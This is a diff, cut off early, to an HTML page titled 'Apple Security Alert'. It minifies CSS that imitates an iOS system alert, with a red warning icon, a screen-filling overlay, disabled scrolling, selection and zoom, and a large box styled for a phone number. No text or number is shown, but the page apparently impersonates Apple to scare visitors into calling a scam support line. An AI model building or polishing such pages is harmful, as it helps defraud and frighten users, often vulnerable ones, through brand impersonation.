@@ -1,109 +1,32 @@
 <!DOCTYPE html>  
 <html>  
 <head>  
-    <meta charset="UTF-8">  
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
-    <title>Apple Security Alert</title>  
-    <style>  
-        * { margin: 0; padding: 0; box-sizing: border-box; }  
-        html, body {  
-            width: 100%;  
-            height: 100%;  
-            overflow: hidden;  
-            position: fixed;  
-            top: 0;  
-            left: 0;  
-        }  
-        body {  
-            background: #f2f2f7;  
-            display: flex;  
-            align-items: center;  
-            justify-content: center;  
-            font-family: -apple-system, 'Helvetica Neue', sans-serif;  
-            -webkit-user-select: none;  
-            user-select: none;  
-        }  
-        .overlay {  
-            position: fixed;  
-            top: 0; left: 0; right: 0; bottom: 0;  
-            background: rgba(0,0,0,0.4);  
-            z-index: 9999;  
-            display: flex;  
-            align-items: center;  
-            justify-content: center;  
-        }  
-        .alert {  
-            width: 88%;  
-            max-width: 285px;  
-            background: rgba(255,255,255,0.98);  
-            border-radius: 14px;  
-            overflow: hidden;  
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);  
-            animation: pop 0.4s cubic-bezier(0.22, 1, 0.36, 1);  
-        }  
-        @keyframes pop {  
-            0% { opacity: 0; transform: scale(0.92); }  
-            100% { opacity: 1; transform: scale(1); }  
-        }  
-        .content {  
-            padding: 24px 20px 0;  
-            text-align: center;  
-        }  
-        .icon {  
-            width: 48px;  
-            height: 48px;  
-            background: #FF3B30;  
-            border-radius: 50%;  
-            display: flex;  
-            align-items: center;  
-            justify-content: center;  
-            margin: 0 auto 12px;  
-            box-shadow: 0 4px 12px rgba(255,59,48,0.3);  
-        }  
-        .icon svg { width: 26px; height: 26px; fill: white; }  
-        h1 {  
-            font-size: 17px;  
-            font-weight: 700;  
-            color: #1C1C1E;  
-            margin-bottom: 6px;  
-        }  
-        .body-text {  
-            font-size: 13px;  
-            line-height: 1.5;  
-            color: #3A3A3C;  
-            margin-bottom: 16px;  
-        }  
-        .body-text strong { color: #1C1C1E; }  
-        .phone-box {  
-            background: #F2F2F7;  
-            border-radius: 10px;  
-            padding: 14px 16px;  
-            margin-bottom: 4px;  
-            border: 1px solid rgba(60,60,67,0.08);  
-        }  
-        .phone-label {  
-            font-size: 12px;  
-            color: #8E8E93;  
-            font-weight: 500;  
-            margin-bottom: 2px;  
-            text-transform: uppercase;  
-            letter-spacing: 0.5px;  
-        }  
-        .phone-num {  
-            font-size: 20px;  
-            font-weight: 700;  
-            color: #1C1C1E;  
-            letter-spacing: 0.3px;  
-        }  
-        .phone-num a {  
-            color: #007AFF;  
-            text-decoration: none;  
-        }  
-        .divider {  
-            height: 0.5px;  
-            background: rgba(60,60,67,0.15);  
-            margin-top: 10px;  
-        }  
-        .ok-btn {  
-            width: 100%;  
-           
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
+<title>Apple Security Alert</title>  
+<style>  
+*{margin:0;padding:0;box-sizing:border-box;}  
+html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;}  
+body{background:#f2f2f7;display:flex;align-items:center;justify-content:center;font-family:-apple-system,'Helvetica Neue',sans-serif;-webkit-user-select:none;user-select:none;}  
+.overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.4);z-index:9999;display:flex;align-items:center;justify-content:center;}  
+.alert{width:88%;max-width:285px;background:rgba(255,255,255,0.98);border-radius:14px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:pop 0.4s cubic-bezier(0.22,1,0.36,1);}  
+@keyframes pop{0%{opacity:0;transform:scale(0.92)}100%{opacity:1;transform:scale(1)}}  
+.content{padding:24px 20px 0;text-align:center;}  
+.icon{width:48px;height:48px;background:#FF3B30;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;box-shadow:0 4px 12px rgba(255,59,48,0.3);}  
+.icon svg{width:26px;height:26px;fill:white;}  
+h1{font-size:17px;font-weight:700;color:#1C1C1E;margin-bottom:6px;}  
+.body{font-size:13px;line-height:1.5;color:#3A3A3C;margin-bottom:16px;}  
+.body strong{color:#1C1C1E;}  
+.pbox{background:#F2F2F7;border-radius:10px;padding:14px 16px;margin-bottom:4px;border:1px solid rgba(60,60,67,0.08);}  
+.plabel{font-size:12px;color:#8E8E93;font-weight:500;margin-bottom:2px;text-transform:uppercase;letter-spacing:0.5px;}  
+.pnum{font-size:20px;font-weight:700;color:#1C1C1E;letter-spacing:0.3px;}  
+.divider{height:0.5px;background:rgba(60,60,67,0.15);margin-top:10px;}  
+.okb{width:100%;padding:14px 0;border:none;background:white;color:#007AFF;font-size:17px;font-weight:600;cursor:pointer;font-family:inherit;letter-spacing:0.3px;}  
+.okb:active{background:#e5e5ea;}  
+</style>  
+</head>  
+<body>  
+<div class="overlay">  
+<div class="alert">  
+<div class="content">  
+<div class="icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 
